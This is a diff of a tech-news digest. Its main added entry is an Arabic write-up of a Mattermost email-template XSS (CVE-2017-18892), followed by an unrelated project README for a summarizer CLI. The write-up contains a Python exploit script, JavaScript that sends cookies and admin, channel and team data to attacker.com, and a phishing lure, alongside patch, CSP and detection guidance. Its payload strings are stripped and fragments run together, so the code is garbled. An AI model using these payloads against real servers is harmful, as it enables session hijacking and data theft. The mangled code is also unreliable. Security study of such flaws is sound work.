+CVE-2017-18892: عندما تخون القوالب الأمان XSS في قوالب البريد الإلكتروني - Mattermost تحت النار البطاقة التعريفية المعرف
+القيمة CVE ID
+CVE-2017-18892 Product
+Mattermost Server CWE
+CWE-79: Cross-site Scripting (XSS) CVSS Score
+6.1 Medium Vector
+CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N الكشف الأولي
+2017 النشر العام
+19 يونيو 2020 آخر تحديث
+29 يناير 2023 التصنيف
+Stored XSS via Email Templates Mattermost Email Template ↓ User Input (غير معقم) ↓ HTML Email Generation ↓ {{.UserName}} ← حقن مباشر! ↓ ↓ تنفيذ الكود في Email Client القالب الضعيف (Go Template):
+// mattermost-server &lt; 4.2.0
+// email_template.html مرحباً {{.UserName}} ← بدون تعقيم! تم إرسال رسالة من {{.SenderName}} ← خطر! {{.MessageContent}} ← يمكن حقن HTML! المشكلة:
+// الكود الضعيف - بدون Escaping
+template.Execute(writer, data) // data.UserName = ""
+// النتيجة: يُنفذ السكريبت في البريد! المرحلة 1: إنشاء حساب خبيث // المهاجم ينشئ حساب باسم خبيث
+POST /api/v4/users
+{ "username": "", "email": "attacker@evil.com", "password": "pass123"
+} المرحلة 2: إرسال رسالة // إرسال رسالة لضحية
+POST /api/v4/posts
+{ "channel_id": "victim_channel", "message": "Check this out!", "root_id": null
+} المرحلة 3: البريد الإلكتروني المرسل مرحباً Victim تم إرسال رسالة من ← تنفيذ فوري! Check this out! المرحلة 4: التنفيذ // عند فتح البريد:
+onerror=alert(document.cookie) ← يُنفذ! // يمكن للمهاجم:
+fetch('https://attacker.com/steal?cookie=' + document.cookie); #!/usr/bin/env python3
+"""
+CVE-2017-18892 - Mattermost XSS via Email Template
+Exploit for educational purposes only
+""" import requests
+import json class MattermostXSS: def __init__(self, target_url): self.target = target_url self.session = requests.Session() self.token = None def create_malicious_user(self): """إنشاء مستخدم باسم يحتوي على XSS""" # الـ Payload xss_payload = '' # إنشاء المستخدم user_data = { "username": xss_payload, "email": "attacker@evil.com", "password": "MaliciousPass123!", "first_name": xss_payload, "last_name": "Evil" } response = self.session.post( f"{self.target}/api/v4/users", json=user_data ) if response.status_code == 201: print("[+] مستخدم خبيث تم إنشاؤه") return response.json() else: print(f"[-] فشل: {response.text}") return None def login(self, email, password): """تسجيل الدخول""" login_data = { "login_id": email, "password": password } response = self.session.post( f"{self.target}/api/v4/users/login", json=login_data ) if response.status_code == 200: self.token = response.headers.get('Token') self.session.headers.update({'Authorization': f'Bearer {self.token}'}) print("[+] تم تسجيل الدخول") return True return False def send_message(self, channel_id, message): """إرسال رسالة (تُرسل إشعار بريد إلكتروني)""" post_data = { "channel_id": channel_id, "message": message } response = self.session.post( f"{self.target}/api/v4/posts", json=post_data ) if response.status_code == 201: print("[+] تم إرسال الرسالة - سيُرسل بريد XSS للأعضاء!") return True return False def exploit(self, target_channel): """تنفيذ الاستغلال الكامل""" print("[*] بدء استغلال CVE-2017-18892") print(f"[*] الهدف: {self.target}") # 1. إنشاء مستخدم خبيث user = self.create_malicious_user() if not user: return False # 2. تسجيل الدخول if not self.login("attacker@evil.com", "MaliciousPass123!"): return False # 3. إرسال رسالة (تُرسل بريد) if self.send_message(target_channel, "مرحباً! تحقق من هذا"): print("[+] نجح الاستغلال!") print("[*] عند فتح البريد، سيُنفذ الكود الخبيث") return True return False # الاستخدام
+if __name__ == "__main__": exploit = MattermostXSS("https://mattermost.target.com") exploit.exploit("channel_id_here") // 1. سرقة Cookies // 2. سرقة Session Tokens // 3. Keylogger في Email Client // 4. Phishing Redirect // 5. استخراج البيانات الحساسة // 1. المهاجم ينشئ حساب باسم:
+username: "" // 2. admin-stealer.js:
+(async function() { // سرقة معلومات Admin const adminData = await fetch('/api/v4/users/me').then(r =&gt; r.json()); // سرقة القنوات const channels = await fetch('/api/v4/channels').then(r =&gt; r.json()); // سرقة الفرق const teams = await fetch('/api/v4/teams').then(r =&gt; r.json()); // إرسال كل شيء fetch('https://attacker.com/admin-data', { method: 'POST', body: JSON.stringify({ adminData, channels, teams }) });
+})(); // النتيجة: سيطرة كاملة على بيانات Admin // XSS Worm - ينتشر تلقائياً تنبيه أمني من Mattermost تم اكتشاف محاولة تسجيل دخول مشبوهة لحسابك انقر أدناه للتحقق من هويتك: التحقق الآن // mattermost-server &gt;= 4.2.0
+// استخدام html/template بدلاً من text/template import ( "html/template" // ← التعقيم التلقائي
+) // القالب الآمن
+tmpl := template.Must(template.New("email").Parse(` مرحباً {{.UserName}} ← يُعقم تلقائياً من {{.SenderName}} {{.MessageContent}} `)) // التنفيذ الآمن
+tmpl.Execute(writer, data) // إذا كان data.UserName = ""
+// النتيجة: &lt;script&gt;alert(1)&lt;/script&gt; ← آمن! 1. التحديث الفوري # فحص الإصدار الحالي
+curl -s http://mattermost-server/api/v4/system/ping | jq # إذا كان &lt; 4.2.0، حدّث فوراً:
+wget https://releases.mattermost.com/4.2.0/mattermost-4.2.0-linux-amd64.tar.gz
+tar -xzf mattermost-4.2.0-linux-amd64.tar.gz
+systemctl stop mattermost
+cp -r mattermost /opt/
+systemctl start mattermost 2. CSP Headers في Email // إضافة Content Security Policy
+emailHeaders := map[string]string{ "Content-Type": "text/html; charset=UTF-8", "Content-Security-Policy": "default-src 'none'; img-src https:; style-src 'unsafe-inline'",
+} 3. تعقيم إضافي import ( "html" "github.com/microcosm-cc/bluemonday"
+) // استخدام bluemonday للتعقيم الشامل
+func SanitizeForEmail(input string) string { p := bluemonday.StrictPolicy() return p.Sanitize(input)
+} // في القالب
+data := EmailData{ UserName: SanitizeForEmail(user.Username), Message: SanitizeForEmail(message.Content),
+} 4. مراجعة القوالب المخصصة # ابحث عن القوالب المخصصة
+find /opt/mattermost -name "*.html" -o -name "*.tmpl" # راجع كل قالب للتأكد من استخدام {{.Variable}} بدون |safe
+grep -r "{{.*}}" /opt/mattermost/templates/ # تحذير: لا تستخدم أبداً
+{{ .UserInput | safe }} ← خطر!
+{{ .Content | noescape }} ← خطر! # 1. فحص قاعدة البيانات للأسماء المشبوهة
+psql -U mmuser -d mattermost -c " SELECT username, email, create_at FROM Users WHERE username LIKE '% NOW() - INTERVAL '24 hours' ORDER BY create_at DESC;
+" أسماء المستخدمين المشبوهة: - يحتوي على: " - "javascript:alert(document.cookie)" الرسائل الخبيثة: - HTML tags في محتوى الرسالة - Base64 encoded scripts - External script sources النشاط الشبكي: - طلبات لـ domains غير معروفة من Email Clients - POST requests لـ /api/v4/posts بمعدل عالي - Session tokens مسروقة تُستخدم من IPs مختلفة سلوك المستخدم: - إنشاء حسابات بأسماء عشوائية/طويلة - إرسال رسائل لقنوات عديدة فوراً - تغيير بيانات Profile بشكل متكرر #!/bin/bash
+# مراجعة أمنية شاملة لـ Mattermost echo " فحص أمان Mattermost"
+echo "========================" # 1. فحص الإصدار
+VERSION=$(curl -s http://localhost:8065/api/v4/system/ping | jq -r '.version')
+echo "الإصدار: $VERSION" if [[ "$VERSION" &lt; "4.2.0" ]]; then echo " خطر! الإصدار ضعيف لـ CVE-2017-18892"
+fi # 2. فحص المستخدمين المشبوهين
+echo ""
+echo " فحص المستخدمين:"
+psql -U mmuser -d mattermost -t -c " SELECT COUNT(*) FROM Users WHERE username ~ '(&lt;|&gt;|script|onerror)'
+" | xargs echo "مستخدمين مشبوهين:" # 3. فحص القوالب
+echo ""
+echo " فحص قوالب البريد:"
+if grep -r "text/template" /opt/mattermost/; then echo " وُجدت قوالب غير آمنة!"
+else echo " القوالب آمنة"
+fi # 4. فحص CSP
+echo ""
+echo " فحص Content Security Policy:"
+if grep -r "Content-Security-Policy" /opt/mattermost/config/; then echo " CSP مفعّل"
+else echo " CSP غير مفعّل"
+fi echo ""
+echo "========================"
+echo " انتهى الفحص" 1. CVE Entry: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18892 2. NVD Details: https://nvd.nist.gov/vuln/detail/CVE-2017-18892 3. Mattermost Security: https://mattermost.com/security-updates/ 4. GitHub Advisory: https://github.com/advisories/GHSA-xxxx-xxxx-xxxx 5. OWASP XSS: https://owasp.org/www-community/attacks/xss/ 6. CWE-79: https://cwe.mitre.org/data/definitions/79.html "لا تثق بأي مُدخَل - حتى لو كان اسم مستخدم"
+استخدم html/template دائماً // آمن - تعقيم تلقائي
+import "html/template" // خطر - بدون تعقيم
+import "text/template" طبقات الحماية Input → Validation → Sanitization → Escaping → Output CSP في كل مكان لا تثق بـ "Safe" Flags // خطير جداً
+{{ .UserInput | safe }} // آمن
+{{ .UserInput }} // auto-escaped "القالب ليس مجرد تصميم - إنه خط الدفاع الأول"
+CVE-2017-18892 يُذكرنا أن الأمان يبدأ من أصغر التفاصيل.
+حتى اسم المستخدم يمكن أن يكون سلاحاً فتاكاً إذا لم نُحصّنه.
+╔═══════════════════════════════════════╗
+║ ZAYED SECURITY RESEARCH TEAM ║
+║ "Trust No Input, Sanitize All" ║
+║ ║
+║ CVE-2017-18892 ║
+║ Severity: MEDIUM (6.1) ║
+║ Status: PATCHED ✓ ║
+╚═══════════════════════════════════════╝ #XSS | #EmailSecurity | #Mattermost | #TemplateInjection
+
+</div>
+
 <div class="article-item" data-lang="en" data-category="opensource" data-source="Dev.to Open Source">
 
-### 12. `EN` [How to Give Claude Code Persistent Memory (Free, Local, 5 Minutes)](data/articles/d9f6fd2176b8325481bce708c3a8b0c8.html)
+### 13. `EN` [How to Give Claude Code Persistent Memory (Free, Local, 5 Minutes)](data/articles/d9f6fd2176b8325481bce708c3a8b0c8.html)
 **Source:** Dev.to Open Source | **Keyword:** `Community`
 The Problem Every Claude Code User Hits on Day Two You spent forty-five minutes explaining your project to Claude Code yesterday. Your folder structure, your naming conventions, the reason you chose Drizzle over Prisma, the three environment variables that need to be set before the test suite runs. By the end of the session, Claude Code understood your codebase like a senior team member.
 Today, you open a new session. Blank slate. It does not remember any of it.
@@ -10029,78 +10121,38 @@ Your AI never has to forget again.
 
 <div class="article-item" data-lang="en" data-category="opensource" data-source="GitHub Trending">
 
-### 13. `EN` [openclaw/openclaw](data/articles/0bd21c2cf11fc945041c46e569bfc6c6.html)
+### 14. `EN` [steipete/summarize](data/articles/844f298b0b62ed867d1d30a587fdadad.html)
 **Source:** GitHub Trending | **Keyword:** `GitHub`
-Your own personal AI assistant. Any OS. Any Platform. The lobster way. OpenClaw — Personal AI Assistant EXFOLIATE! EXFOLIATE! OpenClaw is a personal AI assistant you run on your own devices. It answers you on the channels you already use (WhatsApp, Telegram, Slack, Discord, Google Chat, Signal, iMessage, Microsoft Teams, WebChat), plus extension channels like BlueBubbles, Matrix, Zalo, and Zalo Personal. It can speak and listen on macOS/iOS/Android, and can render a live Canvas you control. The Gateway is just the control plane — the product is the assistant. If you want a personal, single-user assistant that feels local, fast, and always-on, this is it. Website · Docs · Vision · DeepWiki · Getting Started · Updating · Showcase · FAQ · Wizard · Nix · Docker · Discord Preferred setup: run the onboarding wizard (openclaw onboard) in your terminal. The wizard guides you step by step through setting up the gateway, workspace, channels, and skills. The CLI wizard is the path and works on macOS, Linux, and Windows (via WSL2; strongly ). Works with npm, pnpm, or bun. New install? Start here: Getting started Subscriptions (OAuth): Anthropic (Claude Pro/Max) OpenAI (ChatGPT/Codex) Model note: while any model is supported, I strongly recommend Anthropic Pro/Max (100/200) + Opus 4.6 for long‑context strength and better prompt‑injection resistance. See Onboarding. Models (selection + auth) Models config + CLI: Models Auth profile rotation (OAuth vs API keys) + fallbacks: Model failover Install ( ) Runtime: Node ≥22. npm install -g openclaw@latest
-# or: pnpm add -g openclaw@latest openclaw onboard --install-daemon The wizard installs the Gateway daemon (launchd/systemd user service) so it stays running. Quick start (TL;DR) Runtime: Node ≥22. Full beginner guide (auth, pairing, channels): Getting started openclaw onboard --install-daemon openclaw gateway --port 18789 --verbose # Send a message
-openclaw message send --to +1234567890 --message "Hello from OpenClaw" # Talk to the assistant (optionally deliver back to any connected channel: WhatsApp/Telegram/Slack/Discord/Google Chat/Signal/iMessage/BlueBubbles/Microsoft Teams/Matrix/Zalo/Zalo Personal/WebChat)
-openclaw agent --message "Ship checklist" --thinking high Upgrading? Updating guide (and run openclaw doctor). Development channels stable: tagged releases (vYYYY.M.D or vYYYY.M.D-), npm dist-tag latest. beta: prerelease tags (vYYYY.M.D-beta.N), npm dist-tag beta (macOS app may be missing). dev: moving head of main, npm dist-tag dev (when published). Switch channels (git + npm): openclaw update --channel stable|beta|dev. Details: Development channels. From source (development) Prefer pnpm for builds from source. Bun is optional for running TypeScript directly. git clone https://github.com/openclaw/openclaw.git
-cd openclaw pnpm install
-pnpm ui:build # auto-installs UI deps on first run
-pnpm build pnpm openclaw onboard --install-daemon # Dev loop (auto-reload on TS changes)
-pnpm gateway:watch Note: pnpm openclaw ... runs TypeScript directly (via tsx). pnpm build produces dist/ for running via Node / the packaged openclaw binary. Security defaults (DM access) OpenClaw connects to real messaging surfaces. Treat inbound DMs as untrusted input. Full security guide: Security Default behavior on Telegram/WhatsApp/Signal/iMessage/Microsoft Teams/Discord/Google Chat/Slack: DM pairing (dmPolicy="pairing" / channels.discord.dmPolicy="pairing" / channels.slack.dmPolicy="pairing"; legacy: channels.discord.dm.policy, channels.slack.dm.policy): unknown senders receive a short pairing code and the bot does not process their message. Approve with: openclaw pairing approve (then the sender is added to a local allowlist store). Public inbound DMs require an explicit opt-in: set dmPolicy="open" and include "*" in the channel allowlist (allowFrom / channels.discord.allowFrom / channels.slack.allowFrom; legacy: channels.discord.dm.allowFrom, channels.slack.dm.allowFrom). Run openclaw doctor to surface risky/misconfigured DM policies. Highlights Local-first Gateway — single control plane for sessions, channels, tools, and events. Multi-channel inbox — WhatsApp, Telegram, Slack, Discord, Google Chat, Signal, BlueBubbles (iMessage), iMessage (legacy), Microsoft Teams, Matrix, Zalo, Zalo Personal, WebChat, macOS, iOS/Android. Multi-agent routing — route inbound channels/accounts/peers to isolated agents (workspaces + per-agent sessions). Voice Wake + Talk Mode — always-on speech for macOS/iOS/Android with ElevenLabs. Live Canvas — agent-driven visual workspace with A2UI. First-class tools — browser, canvas, nodes, cron, sessions, and Discord/Slack actions. Companion apps — macOS menu bar app + iOS/Android nodes. Onboarding + skills — wizard-driven setup with bundled/managed/workspace skills. Star History Everything we built so far Core platform Gateway WS control plane with sessions, presence, config, cron, webhooks, Control UI, and Canvas host. CLI surface: gateway, agent, send, wizard, and doctor. Pi agent runtime in RPC mode with tool streaming and block streaming. Session model: main for direct chats, group isolation, activation modes, queue modes, reply-back. Group rules: Groups. Media pipeline: images/audio/video, transcription hooks, size caps, temp file lifecycle. Audio details: Audio. Channels Channels: WhatsApp (Baileys), Telegram (grammY), Slack (Bolt), Discord (discord.js), Google Chat (Chat API), Signal (signal-cli), BlueBubbles (iMessage, ), iMessage (legacy imsg), Microsoft Teams (extension), Matrix (extension), Zalo (extension), Zalo Personal (extension), WebChat. Group routing: mention gating, reply tags, per-channel chunking and routing. Channel rules: Channels. Apps + nodes macOS app: menu bar control plane, Voice Wake/PTT, Talk Mode overlay, WebChat, debug tools, remote gateway control. iOS node: Canvas, Voice Wake, Talk Mode, camera, screen recording, Bonjour pairing. Android node: Canvas, Talk Mode, camera, screen recording, optional SMS. macOS node mode: system.run/notify + canvas/camera exposure. Tools + automation Browser control: dedicated openclaw Chrome/Chromium, snapshots, actions, uploads, profiles. Canvas: A2UI push/reset, eval, snapshot. Nodes: camera snap/clip, screen record, location.get, notifications. Cron + wakeups; webhooks; Gmail Pub/Sub. Skills platform: bundled, managed, and workspace skills with install gating + UI. Runtime + safety Channel routing, retry policy, and streaming/chunking. Presence, typing indicators, and usage tracking. Models, model failover, and session pruning. Security and troubleshooting. Ops + packaging Control UI + WebChat served directly from the Gateway. Tailscale Serve/Funnel or SSH tunnels with token/password auth. Nix mode for declarative config; Docker-based installs. Doctor migrations, logging. How it works (short) WhatsApp / Telegram / Slack / Discord / Google Chat / Signal / iMessage / BlueBubbles / Microsoft Teams / Matrix / Zalo / Zalo Personal / WebChat │ ▼
-┌───────────────────────────────┐
-│ Gateway │
-│ (control plane) │
-│ ws://127.0.0.1:18789 │
-└──────────────┬────────────────┘ │ ├─ Pi agent (RPC) ├─ CLI (openclaw …) ├─ WebChat UI ├─ macOS app └─ iOS / Android nodes Key subsystems Gateway WebSocket network — single WS control plane for clients, tools, and events (plus ops: Gateway runbook). Tailscale exposure — Serve/Funnel for the Gateway dashboard + WS (remote access: Remote). Browser control — openclaw‑managed Chrome/Chromium with CDP control. Canvas + A2UI — agent‑driven visual workspace (A2UI host: Canvas/A2UI). Voice Wake + Talk Mode — always‑on speech and continuous conversation. Nodes — Canvas, camera snap/clip, screen record, location.get, notifications, plus macOS‑only system.run/system.notify. Tailscale access (Gateway dashboard) OpenClaw can auto-configure Tailscale Serve (tailnet-only) or Funnel (public) while the Gateway stays bound to loopback. Configure gateway.tailscale.mode: off: no Tailscale automation (default). serve: tailnet-only HTTPS via tailscale serve (uses Tailscale identity headers by default). funnel: public HTTPS via tailscale funnel (requires shared password auth). Notes: gateway.bind must stay loopback when Serve/Funnel is enabled (OpenClaw enforces this). Serve can be forced to require a password by setting gateway.auth.mode: "password" or gateway.auth.allowTailscale: false. Funnel refuses to start unless gateway.auth.mode: "password" is set. Optional: gateway.tailscale.resetOnExit to undo Serve/Funnel on shutdown. Details: Tailscale guide · Web surfaces Remote Gateway (Linux is great) It’s perfectly fine to run the Gateway on a small Linux instance. Clients (macOS app, CLI, WebChat) can connect over Tailscale Serve/Funnel or SSH tunnels, and you can still pair device nodes (macOS/iOS/Android) to execute device‑local actions when needed. Gateway host runs the exec tool and channel connections by default. Device nodes run device‑local actions (system.run, camera, screen recording, notifications) via node.invoke. In short: exec runs where the Gateway lives; device actions run where the device lives. Details: Remote access · Nodes · Security macOS permissions via the Gateway protocol The macOS app can run in node mode and advertises its capabilities + permission map over the Gateway WebSocket (node.list / node.describe). Clients can then execute local actions via node.invoke: system.run runs a local command and returns stdout/stderr/exit code; set needsScreenRecording: true to require screen-recording permission (otherwise you’ll get PERMISSION_MISSING). system.notify posts a user notification and fails if notifications are denied. canvas.*, camera.*, screen.record, and location.get are also routed via node.invoke and follow TCC permission status. Elevated bash (host permissions) is separate from macOS TCC: Use /elevated on|off to toggle per‑session elevated access when enabled + allowlisted. Gateway persists the per‑session toggle via sessions.patch (WS method) alongside thinkingLevel, verboseLevel, model, sendPolicy, and groupActivation. Details: Nodes · macOS app · Gateway protocol Agent to Agent (sessions_* tools) Use these to coordinate work across sessions without jumping between chat surfaces. sessions_list — discover active sessions (agents) and their metadata. sessions_history — fetch transcript logs for a session. sessions_send — message another session; optional reply‑back ping‑pong + announce step (REPLY_SKIP, ANNOUNCE_SKIP). Details: Session tools Skills registry (ClawHub) ClawHub is a minimal skill registry. With ClawHub enabled, the agent can search for skills automatically and pull in new ones as needed. ClawHub Chat commands Send these in WhatsApp/Telegram/Slack/Google Chat/Microsoft Teams/WebChat (group commands are owner-only): /status — compact session status (model + tokens, cost when available) /new or /reset — reset the session /compact — compact session context (summary) /think — off|minimal|low|medium|high|xhigh (GPT-5.2 + Codex models only) /verbose on|off /usage off|tokens|full — per-response usage footer /restart — restart the gateway (owner-only in groups) /activation mention|always — group activation toggle (groups only) Apps (optional) The Gateway alone delivers a great experience. All apps are optional and add extra features. If you plan to build/run companion apps, follow the platform runbooks below. macOS (OpenClaw.app) (optional) Menu bar control for the Gateway and health. Voice Wake + push-to-talk overlay. WebChat + debug tools. Remote gateway control over SSH. Note: signed builds required for macOS permissions to stick across rebuilds (see docs/mac/permissions.md). iOS node (optional) Pairs as a node via the Bridge. Voice trigger forwarding + Canvas surface. Controlled via openclaw nodes …. Runbook: iOS connect. Android node (optional) Pairs via the same Bridge + pairing flow as iOS. Exposes Canvas, Camera, and Screen capture commands. Runbook: Android connect. Agent workspace + skills Workspace root: ~/.openclaw/workspace (configurable via agents.defaults.workspace). Injected prompt files: AGENTS.md, SOUL.md, TOOLS.md. Skills: ~/.openclaw/workspace/skills//SKILL.md. Configuration Minimal ~/.openclaw/openclaw.json (model + defaults): { agent: { model: "anthropic/claude-opus-4-6", },
-} Full configuration reference (all keys + examples). Security model (important) Default: tools run on the host for the main session, so the agent has full access when it’s just you. Group/channel safety: set agents.defaults.sandbox.mode: "non-main" to run non‑main sessions (groups/channels) inside per‑session Docker sandboxes; bash then runs in Docker for those sessions. Sandbox defaults: allowlist bash, process, read, write, edit, sessions_list, sessions_history, sessions_send, sessions_spawn; denylist browser, canvas, nodes, cron, discord, gateway. Details: Security guide · Docker + sandboxing · Sandbox config WhatsApp Link the device: pnpm openclaw channels login (stores creds in ~/.openclaw/credentials). Allowlist who can talk to the assistant via channels.whatsapp.allowFrom. If channels.whatsapp.groups is set, it becomes a group allowlist; include "*" to allow all. Telegram Set TELEGRAM_BOT_TOKEN or channels.telegram.botToken (env wins). Optional: set channels.telegram.groups (with channels.telegram.groups."*".requireMention); when set, it is a group allowlist (include "*" to allow all). Also channels.telegram.allowFrom or channels.telegram.webhookUrl + channels.telegram.webhookSecret as needed. { channels: { telegram: { botToken: "123456:ABCDEF", }, },
-} Slack Set SLACK_BOT_TOKEN + SLACK_APP_TOKEN (or channels.slack.botToken + channels.slack.appToken). Discord Set DISCORD_BOT_TOKEN or channels.discord.token (env wins). Optional: set commands.native, commands.text, or commands.useAccessGroups, plus channels.discord.allowFrom, channels.discord.guilds, or channels.discord.mediaMaxMb as needed. { channels: { discord: { token: "1234abcd", }, },
-} Signal Requires signal-cli and a channels.signal config section. BlueBubbles (iMessage) iMessage integration. Configure channels.bluebubbles.serverUrl + channels.bluebubbles.password and a webhook (channels.bluebubbles.webhookPath). The BlueBubbles server runs on macOS; the Gateway can run on macOS or elsewhere. iMessage (legacy) Legacy macOS-only integration via imsg (Messages must be signed in). If channels.imessage.groups is set, it becomes a group allowlist; include "*" to allow all. Microsoft Teams Configure a Teams app + Bot Framework, then add a msteams config section. Allowlist who can talk via msteams.allowFrom; group access via msteams.groupAllowFrom or msteams.groupPolicy: "open". WebChat Uses the Gateway WebSocket; no separate WebChat port/config. Browser control (optional): { browser: { enabled: true, color: "#FF4500", },
+Point at any URL/YouTube/Podcast or file. Get the gist. CLI and Chrome Extension. Summarize — Chrome Side Panel + CLI Fast summaries from URLs, files, and media. Works in the terminal, a Chrome Side Panel and Firefox Sidebar. 0.11.0 preview (unreleased): this README reflects the upcoming release. 0.11.0 preview highlights (most interesting first) Chrome Side Panel chat (streaming agent + history) inside the sidebar. YouTube slides: screenshots + OCR + transcript cards, timestamped seek, OCR/Transcript toggle. Media-aware summaries: auto‑detect video/audio vs page content. Streaming Markdown + metrics + cache‑aware status. CLI supports URLs, files, podcasts, YouTube, audio/video, PDFs. Feature overview URLs, files, and media: web pages, PDFs, images, audio/video, YouTube, podcasts, RSS. Slide extraction for video sources (YouTube/direct media) with OCR + timestamped cards. Transcript-first media flow: published transcripts when available, Whisper fallback when not. Streaming output with Markdown rendering, metrics, and cache-aware status. Local, paid, and free models: OpenAI‑compatible local endpoints, paid providers, plus an OpenRouter free preset. Output modes: Markdown/text, JSON diagnostics, extract-only, metrics, timing, and cost estimates. Smart default: if content is shorter than the requested length, we return it as-is (use --force-summary to override). Get the extension ( ) One‑click summarizer for the current tab. Chrome Side Panel + Firefox Sidebar + local daemon for streaming Markdown. Chrome Web Store: Summarize Side Panel YouTube slide screenshots (from the browser): Beginner quickstart (extension) Install the CLI (choose one): npm (cross‑platform): npm i -g @steipete/summarize Homebrew (macOS arm64): brew install steipete/tap/summarize Install the extension (Chrome Web Store link above) and open the Side Panel. The panel shows a token + install command. Run it in Terminal: summarize daemon install --token Why a daemon/service? The extension can’t run heavy extraction inside the browser. It talks to a local background service on 127.0.0.1 for fast streaming and media tools (yt‑dlp, ffmpeg, OCR, transcription). The service autostarts (launchd/systemd/Scheduled Task) so the Side Panel is always ready. If you only want the CLI, you can skip the daemon install entirely. Notes: Summarization only runs when the Side Panel is open. Auto mode summarizes on navigation (incl. SPAs); otherwise use the button. Daemon is localhost-only and requires a shared token. Autostart: macOS (launchd), Linux (systemd user), Windows (Scheduled Task). Tip: configure free via summarize refresh-free (needs OPENROUTER_API_KEY). Add --set-default to set model=free. More: Step-by-step install: apps/chrome-extension/README.md Architecture + troubleshooting: docs/chrome-extension.md Firefox compatibility notes: apps/chrome-extension/docs/firefox.md Slides (extension) Select Video + Slides in the Summarize picker. Slides render at the top; expand to full‑width cards with timestamps. Click a slide to seek the video; toggle Transcript/OCR when OCR is significant. Requirements: yt-dlp + ffmpeg for extraction; tesseract for OCR. Missing tools show an in‑panel notice. Advanced (unpacked / dev) Build + load the extension (unpacked): Chrome: pnpm -C apps/chrome-extension build chrome://extensions → Developer mode → Load unpacked Pick: apps/chrome-extension/.output/chrome-mv3 Firefox: pnpm -C apps/chrome-extension build:firefox about:debugging#/runtime/this-firefox → Load Temporary Add-on Pick: apps/chrome-extension/.output/firefox-mv3/manifest.json Open Side Panel/Sidebar → copy token. Install daemon in dev mode: pnpm summarize daemon install --token --dev CLI Install Requires Node 22+. npx (no install): npx -y @steipete/summarize "https://example.com" npm (global): npm i -g @steipete/summarize npm (library / minimal deps): npm i @steipete/summarize-core import { createLinkPreviewClient } from "@steipete/summarize-core/content"; Homebrew (custom tap): brew install steipete/tap/summarize Apple Silicon only (arm64). CLI vs extension CLI only: just install via npm/Homebrew and run summarize ... (no daemon needed). Chrome/Firefox extension: install the CLI and run summarize daemon install --token so the Side Panel can stream results and use local tools. Quickstart summarize "https://example.com" Inputs URLs or local paths: summarize "/path/to/file.pdf" --model google/gemini-3-flash-preview
+summarize "https://example.com/report.pdf" --model google/gemini-3-flash-preview
+summarize "/path/to/audio.mp3"
+summarize "/path/to/video.mp4" Stdin (pipe content using -): echo "content" | summarize -
+pbpaste | summarize -
+# binary stdin also works (PDF/image/audio/video bytes)
+cat /path/to/file.pdf | summarize - Notes: Stdin has a 50MB size limit The - argument tells summarize to read from standard input Text stdin is treated as UTF-8 text (whitespace-only input is rejected as empty) Binary stdin is preserved as raw bytes and file type is auto-detected when possible Useful for piping clipboard content or command output YouTube (supports youtube.com and youtu.be): summarize "https://youtu.be/dQw4w9WgXcQ" --youtube auto Podcast RSS (transcribes latest enclosure): summarize "https://feeds.npr.org/500005/podcast.xml" Apple Podcasts episode page: summarize "https://podcasts.apple.com/us/podcast/2424-jelly-roll/id360084272?i=1000740717432" Spotify episode page (best-effort; may fail for exclusives): summarize "https://open.spotify.com/episode/5auotqWAXhhKyb9ymCuBJY" Output length --length controls how much output we ask for (guideline), not a hard cap. summarize "https://example.com" --length long
+summarize "https://example.com" --length 20k Presets: short|medium|long|xl|xxl Character targets: 1500, 20k, 20000 Optional hard cap: --max-output-tokens (e.g. 2000, 2k) Provider/model APIs still enforce their own maximum output limits. If omitted, no max token parameter is sent (provider default). Prefer --length unless you need a hard cap. Short content: when extracted content is shorter than the requested length, the CLI returns the content as-is. Override with --force-summary to always run the LLM. Minimums: --length numeric values must be &gt;= 50 chars; --max-output-tokens must be &gt;= 16. Preset targets (source of truth: packages/core/src/prompts/summary-lengths.ts): short: target ~900 chars (range 600-1,200) medium: target ~1,800 chars (range 1,200-2,500) long: target ~4,200 chars (range 2,500-6,000) xl: target ~9,000 chars (range 6,000-14,000) xxl: target ~17,000 chars (range 14,000-22,000) What file types work? Best effort and provider-dependent. These usually work well: text/* and common structured text (.txt, .md, .json, .yaml, .xml, ...) Text-like files are inlined into the prompt for better provider compatibility. PDFs: application/pdf (provider support varies; Google is the most reliable here) Images: image/jpeg, image/png, image/webp, image/gif Audio/Video: audio/*, video/* (local audio/video files MP3/WAV/M4A/OGG/FLAC/MP4/MOV/WEBM automatically transcribed, when supported by the model) Notes: If a provider rejects a media type, the CLI fails fast with a friendly message. xAI models do not support attaching generic files (like PDFs) via the AI SDK; use Google/OpenAI/Anthropic for those. Model ids Use gateway-style ids: /. Examples: openai/gpt-5-mini anthropic/claude-sonnet-4-5 xai/grok-4-fast-non-reasoning google/gemini-3-flash-preview zai/glm-4.7 openrouter/openai/gpt-5-mini (force OpenRouter) Note: some models/providers do not support streaming or certain file media types. When that happens, the CLI prints a friendly error (or auto-disables streaming for that model when supported by the provider). Limits Text inputs over 10 MB are rejected before tokenization. Text prompts are preflighted against the model input limit (LiteLLM catalog), using a GPT tokenizer. Common flags summarize [flags] Use summarize --help or summarize help for the full help text. --model : which model to use (defaults to auto) --model auto: automatic model selection + fallback (default) --model : use a config-defined model (see Configuration) --timeout : 30s, 2m, 5000ms (default 2m) --retries : LLM retry attempts on timeout (default 1) --length short|medium|long|xl|xxl|s|m|l| --language, --lang : output language (auto = match source) --max-output-tokens : hard cap for LLM output tokens --cli [provider]: use a CLI provider (--model cli/). Supports claude, gemini, codex, agent. If omitted, uses auto selection with CLI enabled. --stream auto|on|off: stream LLM output (auto = TTY only; disabled in --json mode) --plain: keep raw output (no ANSI/OSC Markdown rendering) --no-color: disable ANSI colors --theme : CLI theme (aurora, ember, moss, mono) --format md|text: website/file content format (default text) --markdown-mode off|auto|llm|readability: HTML -&gt; Markdown mode (default readability) --preprocess off|auto|always: controls uvx markitdown usage (default auto) Install uvx: brew install uv (or https://astral.sh/uv/) --extract: print extracted content and exit (URLs only; stdin - is not supported) Deprecated alias: --extract-only --slides: extract slides for YouTube/direct video URLs and render them inline in the summary narrative (auto-renders inline in supported terminals) --slides-ocr: run OCR on extracted slides (requires tesseract) --slides-dir : base output dir for slide images (default ./slides) --slides-scene-threshold : scene detection threshold (0.1-1.0) --slides-max : maximum slides to extract (default 6) --slides-min-duration : minimum seconds between slides --json: machine-readable output with diagnostics, prompt, metrics, and optional summary --verbose: debug/diagnostics on stderr --metrics off|on|detailed: metrics output (default on) Coding 